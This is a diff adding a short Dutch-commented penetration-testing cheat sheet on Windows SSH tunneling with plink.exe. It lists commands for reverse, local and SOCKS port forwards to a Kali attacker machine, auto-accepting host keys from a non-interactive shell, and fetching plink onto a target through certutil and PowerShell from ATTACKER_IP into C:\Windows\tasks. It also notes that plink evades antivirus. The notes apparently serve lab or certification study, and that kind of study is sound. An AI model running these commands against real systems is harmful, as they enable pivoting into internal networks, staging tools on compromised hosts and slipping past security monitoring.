@@ -1,0 +1,19 @@
+# Plink - Windows SSH Tunneling (PuTTY CLI)
+# === Remote port forward (vanuit non-interactive shell) ===
+cmd.exe /c echo y | plink.exe -ssh -l kali -pw KALI_PASS -R KALI_IP:4444:127.0.0.1:4444 KALI_IP
+# echo y = accepteer host key automatisch
+# === Local port forward ===
+plink.exe -ssh -l kali -pw KALI_PASS -L 8080:INTERNAL_TARGET:80 KALI_IP
+# === Dynamic SOCKS proxy ===
+plink.exe -ssh -l kali -pw KALI_PASS -D 1080 KALI_IP
+# === Met SSH key (geen wachtwoord) ===
+plink.exe -ssh -i key.ppk -l kali -R KALI_IP:4444:127.0.0.1:4444 KALI_IP
+# === Meerdere forwards ===
+plink.exe -ssh -l kali -pw KALI_PASS -R 4444:127.0.0.1:4444 -R 8080:127.0.0.1:80 KALI_IP
+# === Upload plink naar target ===
+certutil -urlcache -f http://ATTACKER_IP/plink.exe C:\Windows\tasks\plink.exe
+# Of via PowerShell:
+(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/plink.exe','C:\Windows\tasks\plink.exe')
+# Tip: plink.exe is onderdeel van PuTTY en wordt niet door AV gedetecteerd
+# Tip: Gebruik -batch om host key prompt te skippen (alternatief voor echo y)
+# Tip: Ideaal wanneer chisel niet beschikbaar is
